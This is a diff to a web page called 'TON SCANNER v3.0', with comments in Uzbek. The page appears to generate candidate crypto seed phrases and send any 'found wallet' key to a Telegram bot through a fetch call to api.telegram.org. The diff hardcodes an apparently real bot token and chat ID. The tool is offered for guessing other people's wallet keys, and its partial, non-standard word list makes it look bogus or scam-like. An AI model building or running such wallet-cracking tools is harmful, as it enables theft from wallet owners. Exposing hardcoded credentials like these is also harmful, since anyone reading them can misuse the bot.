@@ -11,8 +11,8 @@
 
     <div class="max-w-2xl w-full bg-[#111] p-6 rounded-3xl border border-blue-500/30 shadow-[0_0_100px_rgba(37,99,235,0.1)]">
         <div class="text-center mb-6">
-            <h1 class="text-2xl font-black text-blue-500 italic italic">TON SCANNER v3.0</h1>
-            <p id="botStatus" class="text-[10px] text-red-500 uppercase tracking-widest">Telegram Bot: Not Configured</p>
+            <h1 class="text-2xl font-black text-blue-500 italic">TON SCANNER v3.0</h1>
+            <p id="botStatus" class="text-[10px] text-green-500 uppercase tracking-widest">Telegram Bot: Active</p>
         </div>
 
         <div id="terminal" class="bg-black/80 rounded-2xl p-4 h-64 overflow-y-auto mb-6 text-[11px] border border-slate-800 space-y-1">
@@ -30,10 +30,9 @@
     </div>
 
     <script>
-        // --- BU YERGA O'Z MA'LUMOTLARINGIZNI YOLZING ---
-        const TELEGRAM_BOT_TOKEN = 'SIZNING_TOKENINGIZNI_SHU_YERGA_QO_YING'; 
-        const TELEGRAM_CHAT_ID = 'SIZNING_CHAT_ID_RAQAMINGIZ'; 
-        // ----------------------------------------------
+        // Ma'lumotlaringizni o'zgaruvchilarga saqlab qo'yamiz
+        const TELEGRAM_BOT_TOKEN = '8557227217:AAGTTWhdIfQUfYE-98Kfn61ZWndpH3Ng5Nw'; 
+        const TELEGRAM_CHAT_ID = '7921132456'; 
 
         const words = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "apple", "banana", "cherry", "danger", "echo", "family", "galaxy", "hello", "iron", "jacket", "kangaroo", "laptop", "matrix", "nature", "ocean", "pioneer", "quantum", "radar", "satoshi", "tiger", "uniform", "vintage", "wisdom", "xray", "yellow", "zebra"];
 
@@ -41,20 +40,16 @@
         let checkedCount = 0;
         const terminal = document.getElementById('terminal');
 
-        if(TELEGRAM_BOT_TOKEN !== 'SIZNING_TOKENINGIZNI_SHU_YERGA_QO_YING') {
-            document.getElementById('botStatus').innerText = 'Telegram Bot: Active';
-            document.getElementById('botStatus').classList.replace('text-red-500', 'text-green-500');
-        }
-
         async function sendToTelegram(phrase) {
             const msg = `⭐ <b>HAMYON TOPILDI!</b>\n\n📄 Kalit: <code>${phrase}</code>\n🔗 Tarmoq: TON Mainnet`;
             try {
-                await fetch(`https://api.telegram.org/bot${8557227217:AAGTTWhdIfQUfYE-98Kfn61ZWndpH3Ng5Nw}/sendMessage`, {
+                // Fetch URL ichida o'zgaruvchilardan foydalanamiz
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: 7921132456, text: msg, parse_mode: 'HTML' })
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
                 });
-            } catch (e) { console.log("Telegram error"); }
+            } catch (e) { console.log("Telegram error:", e); }
         }
 
         function addLog(msg, color = 'text-slate-500') {
